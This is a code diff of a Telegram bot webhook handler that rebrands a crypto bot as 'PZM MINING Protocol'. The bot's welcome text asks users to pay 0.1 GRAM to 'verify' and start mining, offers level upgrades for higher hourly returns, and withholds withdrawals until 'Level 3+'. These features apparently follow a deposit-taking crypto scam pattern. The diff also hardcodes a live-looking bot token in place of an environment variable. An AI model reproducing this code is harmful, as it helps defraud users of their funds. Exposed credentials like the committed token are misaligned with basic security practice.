@@ -1,8 +1,8 @@
 export default async function handler(req, res) {
-  if (req.method !== "POST") return res.status(200).send("Ownership Bot Active");
+  if (req.method !== "POST") return res.status(200).send("PZM Bot Active");
 
-  const BOT_TOKEN = process.env.BOT_TOKEN;
-  const WEBAPP_URL = process.env.WEBAPP_URL;
+  const BOT_TOKEN = process.env.BOT_TOKEN || "9241066905:AAFbDT3i7I1e_gbo2kenGnjdHzhK2AdoBwA";
+  const WEBAPP_URL = "https://xauto-mine.vercel.app";
 
   try {
     const update = req.body;
@@ -16,12 +16,12 @@ export default async function handler(req, res) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: "👑 *Welcome to Ownership Coin Protocol!*\n\n• Connect your TON Wallet\n• Hold tokens (`EQA1R_...Kxi9k`) to upgrade your *Holder Level*\n• Reach *Level 3+* to unlock instant reward withdrawals!",
+          text: "🔮 *Welcome to PZM MINING Protocol!*\n\n• Verify with *0.1 GRAM* to start mining\n• Upgrade up to *Level 100* for higher hourly PZM\n• Reach *Level 3+* to withdraw your PZM!",
           parse_mode: "Markdown",
           reply_markup: {
             inline_keyboard: [
-              [{ text: "🚀 Launch Ownership App", web_app: { url: `${WEBAPP_URL}${startParam}` } }],
-              [{ text: "💎 Buy Token on DeDust", url: "https://dedust.io/swap/TON/EQA1R_LuQCLHlMgOo1S4G7Y7W1cd0FrAkbA10Zq7rddKxi9k" }]
+              [{ text: "🚀 Launch PZM Mining", web_app: { url: `${WEBAPP_URL}${startParam}` } }],
+              [{ text: "💎 Buy PZM on DeDust", url: "https://dedust.io/swap/TON/EQDROsytSxLtDp_2pRIEainUGqZPRBbXkwayVn7VAT7bHHWL" }]
             ]
           }
         })
